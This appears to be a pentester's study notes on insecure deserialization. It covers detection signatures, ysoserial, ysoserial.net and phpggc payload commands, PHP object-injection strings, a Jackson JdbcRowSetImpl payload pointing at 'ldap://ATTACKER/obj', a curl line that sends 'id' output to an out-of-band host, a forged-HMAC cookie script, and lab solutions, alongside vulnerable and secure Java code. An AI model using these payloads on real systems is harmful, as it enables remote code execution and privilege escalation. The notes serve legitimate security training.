tactic: Initial Access

**Insecure Deserialization** is when an application deserializes user-controlled data without validation, allowing an attacker to manipulate serialized objects to modify application logic, escalate privileges, or achieve RCE. Often called "property-oriented programming" (POP) when chaining gadgets.

```
Serialization: Object → bytes/string → sent to client (cookie, body, header) 

Deserialization: bytes/string → Object → application uses it 

Attacker modifies the serialized data before it is deserialized The application reconstructs a malicious object and executes attacker-controlled logic
```

## Injection Points

- Cookies containing serialized session objects
- Hidden form fields with base64 encoded objects
- `Authorization` header with serialized tokens
- API request bodies (`Content-Type: application/x-java-serialized-object`)
- Viewstate in .NET applications (`__VIEWSTATE` parameter)
- Cache entries, message queues, databases storing serialized objects
- File uploads processed by deserializers

## Checklist

### Detection

- [ ]  Look for base64 blobs in cookies, headers, or body params, decode and check for serialized signatures:

```
	rO0AB...     Java serialized object (base64)
	AC ED 00 05  Java serialized object (hex)
	O:           PHP serialized object
	\x80\x04\x95 Python pickle
```

- [ ]  Check cookies for serialized session data:

```
	Cookie: session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
```

- [ ]  Look for `.NET` ViewState:

```
	__VIEWSTATE=dDw0NzM1OTM3MDc7Oz4=
```

- [ ]  Modify a simple field (e.g. username, role, isAdmin) in the serialized object and observe behaviour
- [ ]  Use Burp Scanner, it flags Java deserialization automatically

### Java Deserialization (ysoserial)

- [ ]  Generate a payload with ysoserial for the detected gadget chain:

```bash
	java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
```

- [ ]  Common gadget chains to try:

```
	CommonsCollections4
	CommonsCollections6
	Spring1
	Spring2
	Groovy1
	URLDNS       (blind detection only, triggers DNS lookup)
```

- [ ]  For blind detection, use `URLDNS` chain with Burp Collaborator:

```bash
	java -jar ysoserial-all.jar URLDNS 'http://OASTIFY.com' | base64 -w 0
```

- [ ]  URL encode the payload before sending if it goes in a query param or cookie

### PHP Deserialization

- [ ]  Inspect the serialized object structure:

```
	O:4:"User":2:{s:4:"role";s:4:"user";s:5:"admin";b:0;}
```

- [ ]  Modify fields directly, change `role` to `admin`, flip `b:0` to `b:1`
- [ ]  Look for magic methods in source code that get triggered on deserialization:

```php
	__wakeup()    triggered on deserialization
	__destruct()  triggered when object is destroyed
	__toString()  triggered when object used as string
```

- [ ]  Chain magic methods through the object graph to reach dangerous sinks (`eval`, `exec`, `system`, `file_put_contents`)

### .NET ViewState

- [ ]  Decode `__VIEWSTATE` from base64 and check if MAC validation is disabled
- [ ]  If no MAC, use ysoserial.net to generate payload:

```bash
	ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -e BASE64_ENCODED_CMD"
```

### Privilege Escalation via Object Manipulation

- [ ]  Decode the serialized session, locate role or privilege fields, modify and re-encode:

```
	PHP:  s:4:"role";s:4:"user"  →  s:5:"admin";s:5:"admin"
	      note: update the string length prefix to match new value length
```

- [ ]  For JSON-based deserialization (Jackson, Gson), inject type confusion:

```json
	{"@class":"com.example.AdminUser","role":"admin"}
```

---

## Attack Payloads

**Java RCE via CommonsCollections4:**

```bash
java -jar ysoserial-all.jar CommonsCollections4 'curl http://OASTIFY.com/$(id)' | base64 -w 0
```

**Java blind detection via DNS:**

```bash
java -jar ysoserial-all.jar URLDNS 'http://OASTIFY.com' | base64 -w 0
```

**PHP object injection, privilege escalation:**

```
Before: O:4:"User":2:{s:4:"name";s:5:"alice";s:4:"role";s:4:"user";}
After:  O:4:"User":2:{s:4:"name";s:5:"alice";s:4:"role";s:5:"admin";}
```

**Jackson polymorphic type injection:**

```json
["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://ATTACKER/obj","autoCommit":true}]
```

---

## White Box Testing

**Vulnerable, Java native deserialization from user-controlled cookie:**

```java
@GetMapping("/profile")
public ResponseEntity<?> profile(@CookieValue("session") String session) throws Exception {
    byte[] decoded = Base64.getDecoder().decode(session);
    ByteArrayInputStream bis = new ByteArrayInputStream(decoded);

    // ObjectInputStream deserializes whatever the attacker sends
    ObjectInputStream ois = new ObjectInputStream(bis);
    User user = (User) ois.readObject(); // RCE if a gadget chain is on the classpath

    return ResponseEntity.ok(user);
}
```

**Vulnerable, Jackson deserialization with polymorphic type handling enabled:**


```java
ObjectMapper mapper = new ObjectMapper();
// enables @class field in JSON, allows attacker to specify any class to instantiate
mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);

User user = mapper.readValue(requestBody, User.class); // attacker controls the class
```

**Vulnerable, XStream deserialization without security restrictions:**


```java
XStream xstream = new XStream();
// no allowlist set, any class on the classpath can be instantiated
Object obj = xstream.fromXML(userInput); // RCE via XStream gadget chains
```

**Secure:**

```java
// Java, use a filter to restrict which classes can be deserialized
ObjectInputStream ois = new ObjectInputStream(bis) {
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        // only allow specific safe classes
        if (!desc.getName().startsWith("com.example.safe.")) {
            throw new InvalidClassException("Unauthorized deserialization: " + desc.getName());
        }
        return super.resolveClass(desc);
    }
};

// Or use Java 9+ deserialization filter
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("com.example.safe.*;!*");
ois.setObjectInputFilter(filter);

// Jackson, disable default typing and use strict type binding
ObjectMapper mapper = new ObjectMapper();
mapper.deactivateDefaultTyping(); // disable @class injection
// bind only to the expected class, never Object or generic types
UserDTO user = mapper.readValue(requestBody, UserDTO.class);

// XStream, set an allowlist
XStream xstream = new XStream();
xstream.allowTypesByWildcard(new String[]{"com.example.safe.**"});
xstream.denyTypesByWildcard(new String[]{"**"}); // deny everything else first

// Prefer stateless tokens like JWT over serialized session objects in cookies
// Never deserialize data from untrusted sources without strict type filtering
```

---

## Labs 

**Modifying serialized objects**


in the cookie we found a base64 encoded   changed 0 to 1

`O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}`



 **Modifying serialized data types**
 
i is for INT and doest take size
```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

**Using application functionality to exploit insecure deserialization**

```
O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"v3c31ff3r6q9r6cp2q8z50w8nmdgiani";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

 **Arbitrary object injection in PHP**


tilde ~ to the file name shows you the source code
GET /libs/CustomTemplate.php~  

`O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`


**Exploiting Java deserialization with Apache Commons**


`java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 `

then used sublime to basically url encode it 


when i used another common collection i had a result of java class not found 

**Exploiting PHP deserialization with a pre-built gadget chain**



```php
<?php
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$secretKey = "6vwbatmap7szvb6kbbdbqgmzlchytkkq";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

secret key was in the php info page which was commented in the code

``./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64``